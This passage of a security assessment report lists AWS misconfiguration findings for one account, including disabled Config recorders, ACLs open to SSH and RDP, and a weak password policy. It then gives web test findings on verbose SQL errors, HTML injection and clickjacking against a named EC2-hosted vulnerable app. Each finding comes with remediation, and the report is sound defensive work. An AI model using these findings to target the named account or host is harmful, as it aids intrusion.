- **Category:** cloudwatch_log_metric_filter_unauthorized_api_calls
- **Resource:** arn:aws:logs:us-east-2:760689105616:log-group

**CloudWatch Logs** for CloudTrail include a metric filter that matches unauthorized API errors (`$.errorCode="*UnauthorizedOperation"` or `$.errorCode="AccessDenied*"`) and a linked alarm that triggers when events match the filter.

**Remediation:** Enable real-time **alerting** by adding a CloudWatch Logs metric filter for unauthorized errors (`*UnauthorizedOperation`, `AccessDenied*`) and associating it with an alarm that notifies responders.
- Enforce **least privilege** to reduce noise
- Integrate with IR tooling for **defense in depth**

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-northeast-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-northeast-2:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-northeast-3:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-south-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-southeast-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ap-southeast-2:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:ca-central-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:eu-central-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:eu-north-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:eu-west-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:eu-west-2:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:eu-west-3:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:sa-east-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:us-east-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:us-east-2:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:us-west-1:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] AWS Config recorder is enabled and not in failure state or disabled
- **Category:** config_recorder_all_regions_enabled
- **Resource:** arn:aws:config:us-west-2:760689105616:recorder

**AWS accounts** have **AWS Config recorders** active and healthy in each Region. It identifies Regions with no recorder, a disabled recorder, or a recorder in a failure state.

**Remediation:** Enable **AWS Config** in every Region with continuous recording and maintain healthy recorder status.

### [MEDIUM] Network ACL does not allow ingress from the Internet to TCP port 22 (SSH)
- **Category:** ec2_networkacl_allow_ingress_tcp_port_22
- **Resource:** arn:aws:ec2:us-east-1:760689105616:network-acl/acl-0394c0b0123ced9aa

**VPC network ACLs** are evaluated for inbound rules that permit `0.0.0.0/0` to access **SSH** on `TCP 22` at the subnet boundary.

**Remediation:** Apply **least privilege** at the subnet layer:
- Do not allow `0.0.0.0/0` to `TCP 22`
- Restrict SSH to trusted sources, or avoid direct SSH via **Session Manager** or a bastion behind **VPN**

Pair tight **security groups** with periodic rule reviews and change control to maintain **defense in depth**.

### [MEDIUM] Network ACL does not allow ingress from the Internet to TCP port 22 (SSH)
- **Category:** ec2_networkacl_allow_ingress_tcp_port_22
- **Resource:** arn:aws:ec2:us-east-2:760689105616:network-acl/acl-0f4a0905d0267aff1

**VPC network ACLs** are evaluated for inbound rules that permit `0.0.0.0/0` to access **SSH** on `TCP 22` at the subnet boundary.

**Remediation:** Apply **least privilege** at the subnet layer:
- Do not allow `0.0.0.0/0` to `TCP 22`
- Restrict SSH to trusted sources, or avoid direct SSH via **Session Manager** or a bastion behind **VPN**

Pair tight **security groups** with periodic rule reviews and change control to maintain **defense in depth**.

### [MEDIUM] Network ACL does not allow ingress from the Internet to TCP port 3389 (RDP)
- **Category:** ec2_networkacl_allow_ingress_tcp_port_3389
- **Resource:** arn:aws:ec2:us-east-1:760689105616:network-acl/acl-0394c0b0123ced9aa

**VPC network ACLs** with inbound rules allowing **RDP** on `TCP 3389` from `0.0.0.0/0` are identified.

Assessment focuses on subnet-level ACL entries that permit this traffic.

**Remediation:** Enforce **least privilege**: do not allow `TCP 3389` from `0.0.0.0/0` in network ACLs.

- Restrict RDP to specific admin IP ranges
- Prefer **bastion hosts** or **Session Manager** over direct RDP
- Use private subnets and layer controls for **defense in depth**

### [MEDIUM] Network ACL does not allow ingress from the Internet to TCP port 3389 (RDP)
- **Category:** ec2_networkacl_allow_ingress_tcp_port_3389
- **Resource:** arn:aws:ec2:us-east-2:760689105616:network-acl/acl-0f4a0905d0267aff1

**VPC network ACLs** with inbound rules allowing **RDP** on `TCP 3389` from `0.0.0.0/0` are identified.

Assessment focuses on subnet-level ACL entries that permit this traffic.

**Remediation:** Enforce **least privilege**: do not allow `TCP 3389` from `0.0.0.0/0` in network ACLs.

- Restrict RDP to specific admin IP ranges
- Prefer **bastion hosts** or **Session Manager** over direct RDP
- Use private subnets and layer controls for **defense in depth**

### [MEDIUM] IAM password policy requires passwords to be at least 14 characters long
- **Category:** iam_password_policy_minimum_length_14
- **Resource:** arn:aws:iam:us-east-2:760689105616:password-policy

**IAM password policy** is assessed for the **minimum password length** setting, confirming it meets `>= 14` characters for IAM console users.

**Remediation:** Set the **minimum password length** to `>= 14` (prefer `16+`).
- Require mixed character types and prevent reuse
- Enforce **MFA** for all console users
- Prefer SSO over local IAM users
- Apply least privilege and monitor authentication events

### [MEDIUM] IAM password policy prevents reuse of the last 24 passwords
- **Category:** iam_password_policy_reuse_24
- **Resource:** arn:aws:iam:us-east-2:760689105616:password-policy

**IAM account password policy** uses **password reuse prevention** set to `24` remembered passwords (maximum history) for IAM users

**Remediation:** Set the password policy to remember `24` previous passwords to block reuse. Combine with **MFA**, strong length and complexity, and avoid rotation practices that encourage predictable patterns. Apply **least privilege** and monitor authentication events as part of **defense in depth**.

### [MEDIUM] VPC flow logs are enabled
- **Category:** vpc_flow_logs_enabled
- **Resource:** arn:aws:ec2:us-east-1:760689105616:vpc/vpc-03d1632e1404b5ec3

**AWS VPCs** have **Flow Logs** configured to capture IP traffic for their network interfaces and deliver records to a logging destination.

VPCs lacking an active flow log configuration are highlighted.

**Remediation:** Enable **VPC Flow Logs** for all VPCs to provide baseline telemetry.
Prefer capturing at least `REJECT` and, for sensitive networks, `ALL`. Send logs to a centralized, access-controlled destination with retention. Apply **least privilege** to writers/readers and integrate with monitoring for **defense in depth**.

### [MEDIUM] VPC flow logs are enabled
- **Category:** vpc_flow_logs_enabled
- **Resource:** arn:aws:ec2:us-east-2:760689105616:vpc/vpc-00eb51332cc39cea6

**AWS VPCs** have **Flow Logs** configured to capture IP traffic for their network interfaces and deliver records to a logging destination.

VPCs lacking an active flow log configuration are highlighted.

**Remediation:** Enable **VPC Flow Logs** for all VPCs to provide baseline telemetry.
Prefer capturing at least `REJECT` and, for sensitive networks, `ALL`. Send logs to a centralized, access-controlled destination with retention. Apply **least privilege** to writers/readers and integrate with monitoring for **defense in depth**.

### [MEDIUM] Improper Error Handling - Verbose SQL and Server Error Messages
- **Category:** WSTG-ERRH-01
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/

The application displays verbose error messages that disclose internal technical details. Three distinct error disclosure issues were identified: (1) SQL errors expose the MariaDB version, query structure, and internal error details when malformed SQL input is submitted; (2) 404 error pages include the full Apache version (Apache/2.4.25 Debian) and the server hostname; (3) The application does not sanitize error output before displaying it to the user. These disclosures assist attackers in identifying specific software versions and potential vulnerabilities. This finding cross-references FINDING-012 (version disclosure) and FINDING-006 (SQL error message disclosure).

**Remediation:** 1. Configure PHP to disable display_errors in production (display_errors = Off in php.ini). 2. Enable error logging to server-side log files instead of outputting to users. 3. Configure Apache to suppress version information (ServerTokens Prod, ServerSignature Off in httpd.conf). 4. Implement a custom error page that shows a generic message without technical details. 5. Wrap database queries in try/catch blocks and present generic error messages to users.

### [MEDIUM] HTML Injection - Unescaped HTML Tags Rendered in Reflected Output
- **Category:** WSTG-CLNT-03
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/

The reflected XSS endpoint at /vulnerabilities/xss_r/ renders HTML tags without sanitization. When a user-supplied HTML tag like &lt;b&gt;BOLD_TEST&lt;/b&gt; is submitted via the name parameter, it is rendered as bold text in the response rather than being escaped. While this overlaps with the reflected XSS finding (FINDING-030), it specifically confirms that arbitrary HTML structure injection is possible, allowing attackers to inject forms, links, images, and other HTML elements beyond just script execution. This could be used for phishing, UI redressing, or form injection attacks.

**Remediation:** Apply htmlspecialchars() or htmlentities() to all user-supplied input before reflecting it in HTML output. Use the ENT_QUOTES flag to escape both single and double quotes. This is the same remediation as for the reflected XSS finding and would fix both issues simultaneously.

### [MEDIUM] Clickjacking - Missing X-Frame-Options and CSP frame-ancestors Header
- **Category:** WSTG-CLNT-09
- **Resource:** http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/

The application does not send an X-Frame-Options header or a Content-Security-Policy with a frame-ancestors directive. This allows the application to be embedded in an iframe on any third-party domain, enabling clickjacking attacks. An attacker can create a malicious page that embeds the DVWA application in a transparent iframe and trick authenticated users into performing unintended actions (e.g., submitting forms, clicking buttons) while believing they are interacting with the attacker's site. This cross-references FINDING-014 (missing security headers) and is particularly dangerous combined with the CSRF vulnerability (FINDING-021).

**Remediation:** 1. Add X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN to all response headers. 2. Alternatively (preferred for modern browsers), add Content-Security-Policy: frame-ancestors 'none' or frame-ancestors 'self'. 3. Configure this in Apache via: Header always append X-Frame-Options SAMEORIGIN. 4. Combined with the CSRF finding, this creates a compounded attack chain that should be addressed urgently.
